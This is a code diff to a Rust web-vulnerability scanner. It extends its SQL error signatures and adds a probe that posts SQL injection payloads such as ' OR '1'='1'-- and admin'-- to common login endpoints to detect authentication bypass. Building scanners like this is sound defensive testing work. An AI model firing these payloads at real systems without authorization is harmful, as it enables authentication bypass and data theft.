@@ -120,17 +120,36 @@ static SSTI_PAYLOADS: &[(&str, &str)] = &[
 
 /// SQL error patterns that indicate SQLi success
 static SQL_ERROR_PATTERNS: &[&str] = &[
+    // MySQL
     "You have an error in your SQL syntax",
     "Warning: mysql_",
-    "ORA-01756",
-    "Microsoft OLE DB Provider for SQL Server",
-    "Unclosed quotation mark",
-    "SQLSTATE",
+    "mysql_fetch",
+    "Mysql server version for the right syntax",
+    "Column count doesn't match",
+    // PostgreSQL
     "pg_query()",
     "syntax error at or near",
+    "ERROR:  unterminated quoted string",
+    "ERROR:  syntax error",
+    // MSSQL
+    "Microsoft OLE DB Provider for SQL Server",
+    "Unclosed quotation mark after the character string",
+    "Incorrect syntax near",
+    "[SQL Server]",
+    // Oracle
+    "ORA-01756",
+    "ORA-00907",
+    "ORA-00933",
+    // SQLite
     "SQLite3::query",
-    "Column count doesn't match",
-    "Mysql server version for the right syntax",
+    "SQLiteException",
+    "unrecognized token:",
+    // Generic
+    "SQLSTATE",
+    "JDBC",
+    "sql syntax",
+    // Boolean-based: identical 200 with different bodies signals possible blind
+    // (handled separately in probe_sqli_post_body)
 ];
 
 // ── Main Entry ────────────────────────────────────────────────────────────────
@@ -146,6 +165,8 @@ pub async fn run(
     let test_urls = build_test_urls(target);
 
     findings.extend(probe_sqli(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
+    // POST-body SQLi targets login/auth endpoints specifically
+    findings.extend(probe_sqli_post_body(Arc::clone(&client), Arc::clone(&sem), target).await?);
     findings.extend(probe_xss(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
     findings.extend(probe_cmdi(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
     findings.extend(probe_ssti(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
@@ -226,6 +247,225 @@ async fn probe_sqli(
                     endpoint: Some(test_url),
                 });
                 break; // One confirmed finding per URL is enough
+            }
+        }
+    }
+
+    Ok(findings)
+}
+
+// ── SQL Injection via POST body (login forms) ─────────────────────────────────
+//
+// Most login pages accept credentials as JSON or form-encoded POST bodies.
+// The GET-only probe above misses these entirely.
+//
+// Strategy:
+//  1. For each login-like endpoint, send a baseline POST with dummy creds and
+//     record the status and response length.
+//  2. Re-POST with a SQLi payload in the email/username field.
+//  3. Flag if:
+//     a) A SQL error pattern appears in the response body, OR
+//     b) A "true" boolean payload (e.g. `' OR '1'='1`) returns 200/302 while
+//        a "false" payload (e.g. `' AND '1'='2`) returns 401/403 — classic
+//        blind boolean SQLi on a login endpoint.
+
+/// Login-like path suffixes to probe
+static LOGIN_PATHS: &[&str] = &[
+    "/login",
+    "/signin",
+    "/api/login",
+    "/api/signin",
+    "/api/auth/login",
+    "/api/user/login",
+    "/api/users/login",
+    "/auth/login",
+    "/account/login",
+    "/user/login",
+    "/rest/user/login",  // OWASP Juice Shop
+    "/rest/user/signin",
+];
+
+/// Payloads that should make a vulnerable login succeed (boolean-true)
+static SQLI_LOGIN_TRUE: &[(&str, &str)] = &[
+    // email field injections
+    ("' OR '1'='1'--",         "password"),
+    ("' OR 1=1--",             "password"),
+    ("' OR 1=1#",              "password"),
+    ("admin'--",               "password"),
+    ("' OR 'x'='x",            "password"),
+    ("' OR '1'='1'/*",         "password"),
+    // UNION-based — leak first row
+    ("' UNION SELECT '1','2','3'--", "password"),
+];
+
+/// Corresponding "false" payload that should NOT bypass auth
+const SQLI_LOGIN_FALSE: (&str, &str) = ("' AND '1'='2'--", "password");
+
+async fn probe_sqli_post_body(
+    client: Arc<Client>,
+    sem: Arc<Semaphore>,
+    base: &str,
+) -> Result<Vec<Finding>> {
+    use serde_json::json;
+
+    let base = base.trim_end_matches('/');
+    let mut findings = Vec::new();
+
+    for path in LOGIN_PATHS {
+        let url = format!("{}{}", base, path);
+
+        // ── Step 1: baseline with dummy credentials (expect 401/403/422) ───────
+        let baseline_status = {
+            let _permit = sem.acquire().await.unwrap();
+            client
+                .post(&url)
+                .header("Content-Type", "application/json")
+                .body(json!({"email": "notarealuserthatexists@valinhall.invalid", "password": "Str0ngP@ss!"}).to_string())
+                .send()
+                .await
+                .map(|r| r.status().as_u16())
+                .unwrap_or(0)
+        };
+
+        // If we get a 404 this path doesn't exist — skip it
+        if baseline_status == 0 || baseline_status == 404 || baseline_status == 405 {
+            continue;
+        }
+
+        debug!("SQLi POST: {} baseline={}", url, baseline_status);
+
+        // ── Step 2: try each true-condition SQLi payload ─────────────────────
+        for (email_payload, pass_payload) in SQLI_LOGIN_TRUE {
+            // Send as JSON (most modern APIs)
+            let json_body = json!({
+                "email": email_payload,
+                "password": pass_payload
+            })
+            .to_string();
+
+            let _permit = sem.acquire().await.unwrap();
+            let resp = match client
+                .post(&url)
+                .header("Content-Type", "application/json")
+                .body(json_body)
+                .send()
+                .await
+            {
+                Ok(r) => r,
+                Err(_) => continue,
+            };
+
+            let inject_status = resp.status().as_u16();
+            let body = resp.text().await.unwrap_or_default();
+
+            // ── Detection A: SQL error in response body ─────────────────────
+            if let Some(pattern) = SQL_ERROR_PATTERNS.iter().find(|&&p| body.contains(p)) {
+                debug!("SQLi POST error-based at {}: '{}'", url, pattern);
+                findings.push(Finding {
+                    id: Uuid::new_v4().to_string(),
+                    category: OwaspCategory::BrokenAccessControl,
+                    severity: Severity::Critical,
+                    title: "SQL Injection (POST Body — Error-Based)".to_string(),
+                    description: format!(
+                        "The login endpoint `{}` leaks a SQL error when a crafted payload \
+                         is sent in the POST body. Payload `{}` triggered: \"{}\".",
+                        url, email_payload, pattern
+                    ),
+                    evidence: Some(format!(
+                        "POST {}\nPayload email: {}\nSQL error: {}",
+                        url, email_payload, pattern
+                    )),
+                    remediation: "Use parameterised queries (prepared statements). Never concatenate POST body fields into SQL. Suppress detailed DB errors in production responses.".to_string(),
+                    source: FindingSource::Dast,
+                    endpoint: Some(url.clone()),
+                });
+                break;
+            }
+
+            // ── Detection B: Boolean-based blind ────────────────────────────
+            // True-condition payload succeeds (2xx/302) while baseline was 401/403
+            let true_succeeded = inject_status < 400
+                && (baseline_status == 401 || baseline_status == 403 || baseline_status == 422);
+
+            if true_succeeded {
+                // Now verify the false-condition payload still fails
+                let false_json = json!({
+                    "email": SQLI_LOGIN_FALSE.0,
+                    "password": SQLI_LOGIN_FALSE.1
+                })
+                .to_string();
+                let _permit2 = sem.acquire().await.unwrap();
+                let false_status = client
+                    .post(&url)
+                    .header("Content-Type", "application/json")
+                    .body(false_json)
+                    .send()
+                    .await
+                    .map(|r| r.status().as_u16())
+                    .unwrap_or(0);
+
+                // True succeeds + false fails — confirmed blind boolean SQLi
+                if false_status >= 400 {
+                    debug!("SQLi POST boolean-blind at {}: true={} false={}",
+                        url, inject_status, false_status);
+                    findings.push(Finding {
+                        id: Uuid::new_v4().to_string(),
+                        category: OwaspCategory::BrokenAccessControl,
+                        severity: Severity::Critical,
+                        title: "SQL Injection (POST Body — Boolean-Blind Authentication Bypass)".to_string(),
+                        description: format!(
+                            "The login endpoint `{}` is vulnerable to SQL injection via the POST body. \
+                             The \"always-true\" payload `{}` in the email field returns HTTP {} (login \
+                             succeeds), while the \"always-false\" payload `{}` returns HTTP {} (login \
+                             fails). This differential confirms boolean-blind SQLi and allows an attacker \
+                             to bypass authentication entirely.",
+                            url, email_payload, inject_status,
+                            SQLI_LOGIN_FALSE.0, false_status
+                        ),
+                        evidence: Some(format!(
+                            "POST {}\nTrue payload email: {} → HTTP {}\nFalse payload email: {} → HTTP {}",
+                            url, email_payload, inject_status, SQLI_LOGIN_FALSE.0, false_status
+                        )),
+                        remediation: "Use parameterised queries (prepared statements). Validate and sanitize all POST body fields. Never construct SQL from login form input.".to_string(),
+                        source: FindingSource::Dast,
+                        endpoint: Some(url.clone()),
+                    });
+                    break;
+                }
+            }
+
+            // ── Also try form-encoded for legacy apps ─────────────────────────
+            let _permit3 = sem.acquire().await.unwrap();
+            let form_resp = client
+                .post(&url)
+                .form(&[("email", *email_payload), ("password", *pass_payload)])
+                .send()
+                .await;
+            if let Ok(r) = form_resp {
+                let form_status = r.status().as_u16();
+                let form_body = r.text().await.unwrap_or_default();
+                if let Some(pattern) = SQL_ERROR_PATTERNS.iter().find(|&&p| form_body.contains(p)) {
+                    findings.push(Finding {
+                        id: Uuid::new_v4().to_string(),
+                        category: OwaspCategory::BrokenAccessControl,
+                        severity: Severity::Critical,
+                        title: "SQL Injection (Form POST — Error-Based)".to_string(),
+                        description: format!(
+                            "The login endpoint `{}` leaks a SQL error when a crafted payload \
+                             is submitted as an HTML form POST. Payload `{}` triggered: \"{}\".",
+                            url, email_payload, pattern
+                        ),
+                        evidence: Some(format!(
+                            "POST {} (form-encoded)\nPayload email: {}\nSQL error: {}",
+                            url, email_payload, pattern
+                        )),
+                        remediation: "Use parameterised queries (prepared statements).".to_string(),
+                        source: FindingSource::Dast,
+                        endpoint: Some(url.clone()),
+                    });
+                    break;
+                }
+                let _ = form_status; // suppress unused warning
             }
         }
     }
